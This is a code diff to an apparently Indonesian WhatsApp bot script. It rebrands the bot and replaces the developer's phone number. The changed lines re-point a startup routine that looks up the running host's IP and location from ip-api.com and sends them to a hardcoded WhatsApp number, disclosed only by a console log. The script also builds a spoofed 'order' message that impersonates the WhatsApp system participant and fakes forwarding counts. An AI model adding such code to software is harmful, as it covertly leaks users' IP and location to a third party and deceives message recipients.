@@ -240,7 +240,7 @@ console.log(color(`${spc4}                       < =============================
 	Ramdani.on('connecting', () => {
 		console.log(color('[ Ramdani Official ]', 'aqua'), color('Menyambungkan!'));
 	})
-const ftroli = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "6289512545999-1604595598@g.us" }, "message": { orderMessage: { itemCount: 500, status: 200, thumbnail: fs.readFileSync(`./media/foto/thumb.jpg`), surface: 200, message: `【 RAMDANI BOTZ 】`, orderTitle: 'Ramdani Official', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
+const ftroli = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "62881037397248-1604595598@g.us" }, "message": { orderMessage: { itemCount: 500, status: 200, thumbnail: fs.readFileSync(`./media/foto/thumb.jpg`), surface: 200, message: `【 KUPYET BOTZ 】`, orderTitle: 'Ramdani Official', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
 const spinner = { 
   "interval": 120,
   "frames": [
@@ -306,7 +306,7 @@ const spinner = {
     ]
 
     buttonMessagee = {
-        contentText: `BOT TELAH AKTIF DI NOMOR INI JANGAN LUPA SUBS YT RAMDANI OFFICIAL`,
+        contentText: `BOT TELAH AKTIF DI NOMOR INI`,
         footerText: `${fake.FakeReply}`,
         buttons: buttonss,
         headerType: 1
@@ -314,11 +314,11 @@ const spinner = {
     console.log(color('|WARN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       Ramdani.sendMessage("6289512545999@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, { contextInfo: { externalAdReply: { title: `Developer ${setting.NamaBot}`, body: "", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/foto/thumb.jpg'), sourceUrl: `https://wa.me/6289512545999?text=Assalamualaikum+bwang:v` } }})
+       Ramdani.sendMessage("62881037397248@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, { contextInfo: { externalAdReply: { title: `Developer ${setting.NamaBot}`, body: "", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/foto/thumb.jpg'), sourceUrl: `https://wa.me/+62881037397248?text=Suastiastu%20Kak` } }})
      console.log(color('|WARN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
     Ramdani.sendMessage(`${setting.NomorOwner}@s.whatsapp.net`, buttonMessagee, MessageType.buttonsMessage, {
-        caption: '[ RAMDANI BOTZ ]',
+        caption: '[ KUPYET BOTZ ]',
         "contextInfo": {
             text: 'hi',
             "forwardingScore": 1000000000,
